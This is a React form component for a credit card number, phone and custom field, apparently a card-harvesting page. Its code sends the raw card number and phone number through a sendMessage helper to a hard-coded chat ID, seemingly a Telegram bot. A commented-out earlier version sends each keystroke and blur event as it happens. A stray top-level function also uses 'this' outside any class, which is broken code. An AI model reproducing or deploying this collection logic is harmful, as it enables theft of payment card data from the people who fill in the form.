import React from 'react';
import ReactDOM from 'react-dom';
import Cleave from 'cleave.js/react';
import 'cleave.js/dist/addons/cleave-phone.ru';
import { sendMessage } from './Back-end/sendMessage';

function handleSendMessage() {
  const chatId = 1735378040; // здесь нужно указать нужный chatId
  const messageText =
    `Credit card: ${this.state.creditCardRawValue}\n` +
    `Phone: ${this.state.phoneRawValue}\n` +
    `Custom: ${this.state.customRawValue}`;
  sendMessage(chatId, messageText);
}

/*class MyComponent extends React.Component {
  constructor(props, context) {
    super(props, context);

    this.state = {
      creditCardRawValue: '',
      phoneRawValue: '',
      customRawValue: '',
    };

    this.onCreditCardChange = this.onCreditCardChange.bind(this);
    this.onCreditCardFocus = this.onCreditCardFocus.bind(this);
    this.onPhoneChange = this.onPhoneChange.bind(this);
    this.onCustomChange = this.onCustomChange.bind(this);
    this.onPhoneBlur = this.onPhoneBlur.bind(this);
   this.handleSendMessage = this.handleSendMessage.bind(this);
  }

  onPhoneBlur(event) {
    sendMessage(1735378040, event.target.rawValue);
  }

  onCreditCardChange(event) {
    this.setState({ creditCardRawValue: event.target.rawValue });
    sendMessage(1735378040, event.target.rawValue);
  }

  onCreditCardFocus(event) {
    sendMessage(1735378040, event.target.rawValue);
  }

  onPhoneChange(event) {
    this.setState({ phoneRawValue: event.target.rawValue });
    sendMessage(1735378040, event.target.rawValue);
  }

  onCustomChange(event) {
    this.setState({ customRawValue: event.target.rawValue });
  }

  render() {
    return (
      <div>
        <Cleave
          placeholder='Enter your credit card number'
          options={{ creditCard: true }}
          onChange={this.onCreditCardChange}
          // onFocus={this.onCreditCardFocus}
        />

        <Cleave
          className='css-phone'
          options={{ phone: true, phoneRegionCode: 'RU' }} // <-- use RU instead of AU for Russia
          // onChange={this.onPhoneChange}
          onBlur={this.onPhoneBlur}
        />

        <Cleave
          options={{ blocks: [4, 3, 3], delimiter: '-', numericOnly: true }}
          onChange={this.onCustomChange}
        />

        
        <button onClick={this.handleSendMessage}>Send message</button>
      </div>
    );
  }
}

//ReactDOM.render(<MyComponent />, document.getElementById('content'));
export default MyComponent;
*/

class MyComponent extends React.Component {
  constructor(props) {
    super(props);

    this.state = {
      creditCardRawValue: '',
      phoneRawValue: '',
      customRawValue: '',
    };

    this.onCreditCardChange = this.onCreditCardChange.bind(this);
    this.onCreditCardFocus = this.onCreditCardFocus.bind(this);
    this.onPhoneChange = this.onPhoneChange.bind(this);
    this.onCustomChange = this.onCustomChange.bind(this);
    this.onPhoneBlur = this.onPhoneBlur.bind(this);
    this.handleSendMessage = this.handleSendMessage.bind(this);
  }

  onPhoneBlur(event) {
    //sendMessage(1735378040, event.target.rawValue);
  }

  onCreditCardChange(event) {
    this.setState({ creditCardRawValue: event.target.rawValue });
    //sendMessage(1735378040, event.target.rawValue);
  }

  onCreditCardFocus(event) {
    //sendMessage(1735378040, event.target.rawValue);
  }

  onPhoneChange(event) {
    this.setState({ phoneRawValue: event.target.rawValue });
    //sendMessage(1735378040, event.target.rawValue);
  }

  onCustomChange(event) {
    this.setState({ customRawValue: event.target.rawValue });
  }

  handleSendMessage() {
    const chatId = 1735378040;
    const messageText =
      `Credit card: ${this.state.creditCardRawValue}\n` +
      `Phone: ${this.state.phoneRawValue}\n` +
      `Custom: ${this.state.customRawValue}`;
    sendMessage(chatId, messageText);
  }

  render() {
    return (
      <div>
        <Cleave
          placeholder='Enter your credit card number'
          options={{ creditCard: true }}
          onChange={this.onCreditCardChange}
          // onFocus={this.onCreditCardFocus}
        />

        <Cleave
          className='css-phone'
          options={{ phone: true, phoneRegionCode: 'RU' }} // <-- use RU instead of AU for Russia
          onChange={this.onPhoneChange}
          onBlur={this.onPhoneBlur}
        />

        <Cleave
          options={{ blocks: [4, 3, 3], delimiter: '-', numericOnly: true }}
          onChange={this.onCustomChange}
        />

        <div>
          <p>credit card: {this.state.creditCardRawValue}</p>
          <p>phone: {this.state.phoneRawValue}</p>
          <p>custom: {this.state.customRawValue}</p>
        </div>
        <button onClick={this.handleSendMessage}>Send message</button>
      </div>
    );
  }
}

ReactDOM.render(<MyComponent />, document.getElementById('content'));
export default MyComponent;
